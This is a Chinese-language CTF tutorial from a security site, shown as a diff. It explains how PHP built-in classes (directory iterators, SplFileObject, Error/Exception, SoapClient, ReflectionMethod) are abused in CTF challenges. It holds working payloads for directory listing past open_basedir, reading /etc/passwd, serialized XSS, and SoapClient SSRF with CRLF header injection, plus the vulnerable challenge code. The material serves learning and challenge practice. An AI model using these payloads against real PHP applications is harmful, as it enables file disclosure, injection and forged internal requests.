@@ -1,0 +1,758 @@
+# 浅析PHP原生类
+
+阅读量 **288724**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2022-01-17 15:30:27
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t014625955349e8aa28.png)
+
+## 前言：
+
+从2021年开始参加CTF比赛开始，就有几次遇到PHP原生类函数，自己也从来系统学习过这些类是如何使用的，但是该考点很常见，所以就来系统的学习一下。
+
+## 分类
+
+###  1.读取目录/文件（内容）
+
+###  2.构造XSS
+
+###  3.Error绕过
+
+###  4.SSRF
+
+###  5.获取注释内容
+
+这里本人只列出了在CTF比赛中比较常见的PHP原生类利用方式
+
+###  1.读取目录/文件（内容）
+
+**1.1.查看文件类**
+
+这里介绍两个原生类
+
+**[Directorylterator](https://www.php.net/manual/zh/class.directoryiterator.php)**
+
+(PHP 5, PHP 7, PHP 8)
+
+**[Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php)**
+
+(PHP 5 >= 5.3.0, PHP 7, PHP 8)
+
+当然从官方文档我们不难看出两个原生类的关系
+
+![](https://p4.ssl.qhimg.com/t019dfd53b1d2f85773.png)
+
+即继承关系  
+查看官方文档可以发现在该类下有一个__toString()方法
+
+![](https://p1.ssl.qhimg.com/t01b5bf2423deb693e0.png)
+
+而这个__toString()方法可以获取字符串形式的文件名
+
+这边起一个docker环境本地测试一下
+
+测试代码：
+
+    
+    
+    <?php
+    highlight_file(__file__);
+    $dir = $_GET['ki10Moc'];
+    $a = new DirectoryIterator($dir);
+    foreach($a as $f){
+        echo($f->__toString().'<br>');
+    }
+    ?>
+    
+
+可以直接配合glob伪协议来读取目录
+
+下面看一下效果图
+
+![](https://p3.ssl.qhimg.com/t01e854070ea6d3f060.png)
+
+![](https://p1.ssl.qhimg.com/t01ea563b5212ce6621.png)
+
+![](https://p1.ssl.qhimg.com/t01a8ec6eddafe4f1e0.png)
+
+![](https://p0.ssl.qhimg.com/t01aa5e3e9a6fef82ae.png)
+
+这种姿势也可以无视open_basedir的限制
+
+并且从图中就可以看出这两个原生类的些许区别了，Filesystemlterator会以绝路路径的形式展现，而DirectoryIterator仅显示出当前目录下的文件信息
+
+这两个类同样也有一句话形式payload：
+
+DirectoryIterator:
+
+    
+    
+    $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
+    
+
+FilesystemIterator:
+
+    
+    
+    $a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
+    
+
+这里简单测试一下
+
+**CTFshow web74**
+
+    
+    
+    error_reporting(0);
+    ini_set('display_errors', 0);
+    // 你们在炫技吗？
+    if(isset($_POST['c'])){
+            $c= $_POST['c'];
+            eval($c);
+            $s = ob_get_contents();
+            ob_end_clean();
+            echo preg_replace("/[0-9]|[a-z]/i","?",$s);
+    }else{
+        highlight_file(__FILE__);
+    }
+    ?>
+    
+
+传入payload
+
+    
+    
+    c=$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}exit();
+    
+
+得到
+
+![](https://p2.ssl.qhimg.com/t012a87e4f6d1978130.png)
+
+包含一下即可
+
+    
+    
+    c=include('/flagx.txt');exit();
+    
+
+**[Globlterator](https://www.php.net/manual/zh/class.globiterator.php)**
+
+(PHP 5 >= 5.3.0, PHP 7, PHP 8)
+
+与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于
+glob()，可以通过模式匹配来寻找文件路径。
+
+既然遍历一个文件系统性为类似于glob()
+
+所以在这个类中不需要配合glob伪协议，可以直接使用
+
+看了一下文档发现该原生类是继承FilesystemIterator的，所以也是以绝对路径显示的
+
+![](https://p0.ssl.qhimg.com/t01e27b011167c56ff5.png)
+
+测试代码
+
+    
+    
+    <?php
+    highlight_file(__file__);
+    $dir = $_GET['ki10Moc'];
+    $a = new GlobIterator($dir);
+    foreach($a as $f){
+        echo($f->__toString().'<br>');
+    }
+    ?>
+    
+
+![](https://p2.ssl.qhimg.com/t01cf7107806fb6f656.png)
+
+传参直接给路径就行
+
+**1.2读取文件内容**
+
+[SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php)  
+(PHP 5 >= 5.1.2, PHP 7, PHP 8)
+
+> SplFileInfo类为单个文件的信息提供了高级的面向对象接口  
+>  SplFileInfo::__toString — Returns the path to the file as a string
+> //将文件路径作为字符串返回
+
+![](https://p2.ssl.qhimg.com/t015f42e4c3564e969e.png)
+
+测试代码：
+
+    
+    
+    <?php
+    highlight_file(__file__);
+    $context = new SplFileObject('/etc/passwd');
+    foreach($context as $f){
+        echo($f);
+    }
+    
+
+![](https://p0.ssl.qhimg.com/t0113810294b306ce19.png)
+
+这里提一个小trick  
+PHP的动态函数调用
+
+举个例子
+
+来看一下下面这段代码展示效果
+
+    
+    
+    <?php
+    echo ('system')('dir');
+    ?>
+    
+
+![](https://p3.ssl.qhimg.com/t014f29c5b5d1b8e6fe.png)
+
+发现其实就是调用了system函数执行了dir
+
+那这里给出一个Demo，供大家参考
+
+    
+    
+    class Example{
+        public $class;
+        public $data;
+        public function __construct()
+        {
+            $this->class = "FilesystemIterator";
+            $this->data = "/";
+        }
+    //    public function __destruct()
+    //    {
+    //        echo new $this->class($this->data);
+    //    }
+    }
+    
+
+若是在反序列化题目，或者更多是在pop链构造的题目中见到形如  
+$this->class($this->data)  
+那就可以__destruct()方法传入类名和参数来构造我们的恶意paylaod
+
+###  2.构造XSS
+
+**[Error](https://www.php.net/manual/zh/class.error.php)
+/[Exception](https://www.php.net/manual/zh/class.exception.php)**
+
+官方文档显示两个内置类的使用条件：  
+Error：用于PHP7、8，开启报错。  
+Exceotion：用于PHP5、7、8，开启报错。
+
+Error是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的
+
+PHP7中，可以在echo时（PHP对象被当做字符串或使用）触发__toString，来构造XSS。
+
+从官方文档中可以看出，这两个原生类的属性相同，都是对message、code、file、line的信息处理，并调用__toString()方法将异常的对象转换为字符串
+
+![](https://p4.ssl.qhimg.com/t019c098d8e8c3676e0.png)
+
+测试代码：
+
+    
+    
+    <?php
+    highlight_file(__file__);
+    $a = unserialize($_GET['k']);
+    echo $a;
+    ?>
+    
+
+利用Exception::__toString方法来构造xss
+
+    
+    
+    <?php
+    $a = new Exception("<script>alert('U_F1ind_Me')</script>");//new Error
+    $b = serialize($a);
+    echo urlencode($b);
+    ?>
+    //O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A36%3A%22%3Cscript%3Ealert%28%27U_F1ind_Me%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A34%3A%22D%3A%5CPHPstorm%5CPHPstormcode%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
+    
+
+![](https://p5.ssl.qhimg.com/t019d7ea9c7cafe9c6d.png)
+
+###  3.绕过哈希
+
+还是这两个类
+
+**[Error](https://www.php.net/manual/zh/class.error.php)
+/[Exception](https://www.php.net/manual/zh/class.exception.php)**
+
+这里就用到我们上面提到的四个属性
+
+message
+
+错误消息内容
+
+code
+
+错误代码
+
+file
+
+抛出错误的文件名
+
+line
+
+抛出错误的行数
+
+**注：这里会返回错误的行号，所以两个不同的对象在绕过hash函数时需要在同一行中。**
+
+    
+    
+    <?php
+    try {
+        throw new Error("Some error message");
+    } catch(Error $e) {
+        echo $e;
+    }
+    ?>
+    
+
+来看一下报错信息
+
+    
+    
+    Error: Some error message in L:\PHPstorm\PHPstormcode\Error.php:3 Stack trace: #0 {main}
+    
+
+这里我们可以再来做个小测试  
+来判断该原生类返回的信息是否相同
+
+测试代码：
+
+    
+    
+    <?php
+    $a = new Error("payload",1);$b = new Error("payload",2);
+    var_dump($a === $b);//对a和b进行判断
+    echo '<br>';
+    echo $a;//输出a
+    echo '<br>';
+    echo $b;//输出b
+    echo '<br>';
+    
+
+来看一下结果
+
+    
+    
+    bool(false)
+    Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
+    Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
+    
+
+![](https://p0.ssl.qhimg.com/t010d6287b28b54d992.png)
+
+完全一样！！！
+
+**例题 [2020 极客大挑战]Greatphp**
+
+这个题目是个经典的哈希值判断绕过，也是这个题目让我认识了Error
+
+源码：
+
+    
+    
+    <?php
+    error_reporting(0);
+    class SYCLOVER {
+        public $syc;
+        public $lover;
+    
+        public function __wakeup(){
+            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
+               if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
+                   eval($this->syc);
+               } else {
+                   die("Try Hard !!");
+               }
+    
+            }
+        }
+    }
+    
+    if (isset($_GET['great'])){
+        unserialize($_GET['great']);
+    } else {
+        highlight_file(__FILE__);
+    }
+    
+    ?>
+    
+
+可以看出这里反序列化后直接调用__wakeup()方法，该方法会对两个成员变量进行判断，两者不相等，md5加密后强等于，sha1加密后强等于。
+
+这里我们就使用Error类即可绕过。
+
+关于题解网上有许多资源，这里就不再赘述。
+
+###  4.SSRF
+
+**[SoapClient](https://www.php.net/manual/en/class.soapclient.php)**
+
+(PHP 5, PHP 7, PHP 8)
+
+这里最早是在CTFshow的反序列化遇到的，当时都没听说过原生类，更不知道原生类还能SSRF,本类介绍最后来做一下这道题目
+
+PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。
+
+我的理解就是这个原生类大概类似Python中的requests库，可以与浏览器之间交互，并向其发送报文
+
+函数形式：
+
+    
+    
+    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
+    
+
+第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
+
+wsdl，就是一个xml格式的文档，用于描述Web Server的定义
+
+第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置ilocation和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
+
+老规矩，还是本地测试一下，比翻博客更容易理解
+
+测试代码：
+
+    
+    
+    <?php
+    $a = new SoapClient(null,array('location'=>'http://192.168.61.140:2021/ki10Moc', 'uri'=>'http://192.168.61.140:2021'));
+    $b = serialize($a);
+    echo $b;
+    $c = unserialize($b);
+    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+    ?>
+    
+
+本地也起个端口来看一下回显
+
+![](https://p3.ssl.qhimg.com/t0160b17c875f784f67.png)
+
+从图中可以看到这就是一次报文的发送，记录着HTTP的一些header信息
+
+试着注入Cookie看一下
+
+    
+    
+    <?php
+    $target = 'http://192.168.61.140:2023/';
+    $a = new SoapClient(null,array('location' => $target, 'user_agent' => "ki10Moc\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
+    $b = serialize($a);
+    echo $b;
+    $c = unserialize($b);
+    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+    ?>
+    
+
+从图中可以看到我们Use-Agent的信息已经替换成了ki10Moc
+
+![](https://p4.ssl.qhimg.com/t01611ec84158368fa4.png)
+
+在学习的时候我突然想到暑假看到一个一篇关于CRLF攻击的文章  
+那在这里我们可不可以将两者结合起来，构造恶意的payload头部信息
+
+另外，通过http的报文信息可以发现Content-Type在UA头的下面
+
+![](https://p4.ssl.qhimg.com/t01d7c8585d2e32d053.png)
+
+请求的报文由请求头和body组成，请求头内部和body换行都是一个\r\n，也就是一个换行符(\n)一个回车符(\r)，而两者之间是用两组换行符和回车符隔开，即\r\n\r\n
+
+这里就是用CRLF(回车+换行的简称)注入一些恶意代码行执行。
+
+[这里可以看看wooyun的关于CRLF介绍](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)
+
+那么下面我们就来尝试一下
+
+测试代码：
+
+    
+    
+    <?php
+    $target = 'http://192.168.27.173:2023/';
+    $post_data = 'data=ki10Moc';
+    $headers = array(
+        'X-Forwarded-For: 127.0.0.1',
+        'Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958'
+    );
+    $a = new SoapClient(null,array('location' => $target,'user_agent'=>'Happy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'ki10Moc'));
+    $b = serialize($a);
+    $b = str_replace('^^',"\r\n",$b);
+    echo $b;
+    $c = unserialize($b);
+    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+    ?>
+    
+
+![](https://p4.ssl.qhimg.com/t012fd70f87d33fbd7b.png)
+
+返回的信息
+
+    
+    
+    Connection from 192.168.27.1 62590 received!
+    POST / HTTP/1.1
+    Host: 192.168.27.173:2023
+    Connection: Keep-Alive
+    User-Agent: Happy
+    Content-Type: application/x-www-form-urlencoded
+    X-Forwarded-For: 127.0.0.1
+    Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958
+    Content-Length: 12
+    
+    data=ki10Moc
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "ki10Moc#a"
+    Content-Length: 368
+    
+
+从这里我们可以看到我们伪造的XFF头，注入的Cookie和UA头都是可以成功实现的
+
+那么最后就来看一下让我认识Soapclint这个原生类的题目
+
+**CTFshow web259**
+
+源码：
+
+    
+    
+    $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    array_pop($xff);
+    $ip = array_pop($xff);
+    
+    
+    if($ip!=='127.0.0.1'){
+        die('error');
+    }else{
+        $token = $_POST['token'];
+        if($token=='ctfshow'){
+            file_put_contents('flag.txt',$flag);
+        }
+    }
+    
+
+$_SERVER[‘HTTP_X_FORWARDED_FOR’]会获取我们的XFF头的信息
+
+并要求是127.0.0.1，token为ctfshow
+
+poc：
+
+    
+    
+    <?php
+    $target = 'http://127.0.0.1/flag.php';
+    $post_string = 'token=ctfshow';
+    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
+    $a = serialize($b);
+    $a = str_replace('^^',"\r\n",$a);
+    echo urlencode($a);
+    ?>
+    
+
+传参即可
+
+###  5.获取注释内容
+
+这是2021年国赛的时候，遇到的一个题目，也是我唯一做出来的题目….呜呜呜
+
+**[ReflectionMethod](https://www.php.net/manual/zh/class.reflectionmethod.php)**
+
+(PHP 5 >= 5.1.0, PHP 7, PHP 8)
+
+ReflectionFunctionAbstract::getDocComment — 获取注释内容  
+由该原生类中的getDocComment方法可以访问到注释的内容
+
+**本人没有在网上找到环境，就用源码自己改了一下注释和flag**
+
+源码：
+
+    
+    
+    <?php
+    highlight_file(__file__);
+    class User
+    {
+        private static $c = 0;
+    
+        function a()
+        {
+            return ++self::$c;
+        }
+    
+        function b()
+        {
+            return ++self::$c;
+        }
+    
+        function c()
+        {
+            return ++self::$c;
+        }
+    
+        function d()
+        {
+            return ++self::$c;
+        }
+    
+        function e()
+        {
+            /**
+             * flag{asdgjfiokjFJI305-34525I47U-3SDFG}
+             */
+            return ++self::$c;
+        }
+    
+        function f()
+        {
+            return ++self::$c;
+        }
+    
+        function g()
+        {
+            return ++self::$c;
+        }
+    
+        function h()
+        {
+            return ++self::$c;
+        }
+    
+        function i()
+        {
+            return ++self::$c;
+        }
+    
+        function j()
+        {
+            return ++self::$c;
+        }
+    
+        function k()
+        {
+            return ++self::$c;
+        }
+    
+        function l()
+        {
+            return ++self::$c;
+        }
+    
+        function m()
+        {
+            return ++self::$c;
+        }
+    
+        function n()
+        {
+            return ++self::$c;
+        }
+    
+        function o()
+        {
+            return ++self::$c;
+        }
+    
+        function p()
+        {
+            return ++self::$c;
+        }
+    
+        function q()
+        {
+            return ++self::$c;
+        }
+    
+        function r()
+        {
+            return ++self::$c;
+        }
+    
+        function s()
+        {
+            return ++self::$c;
+        }
+    
+        function t()
+        {
+            return ++self::$c;
+        }
+    
+    }
+    
+    $rc=$_GET["rc"];
+    $rb=$_GET["rb"];
+    $ra=$_GET["ra"];
+    $rd=$_GET["rd"];
+    $method= new $rc($ra, $rb);
+    var_dump($method->$rd());
+    
+
+这里rc是传入原生类名，rb和ra都是传入类的属性，rd时传入类方法，后面就是实例化并且调用该方法。
+
+payload：
+
+    
+    
+    ?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
+    
+
+![](https://p0.ssl.qhimg.com/t01be9035739587a99b.png)
+
+这些就是CTF小白目前所遇到的所有PHP原生类，都是基础的介绍和学习，外加一点点自己的思考。
+
+最后借乔布斯的名言结尾吧
+
+**Stay hungry, stay foolish!**
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **ki10、Mac** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/264823](/post/id/264823)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Web安全](/tag/Web安全)
+  * [PHP](/tag/PHP)
+  * [反序列化](/tag/反序列化)
+
+ **+1** __24赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=WYnym4vibcOYtjibOFdtqb9g&s=40&t=1613205916)
+ki10、Mac
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
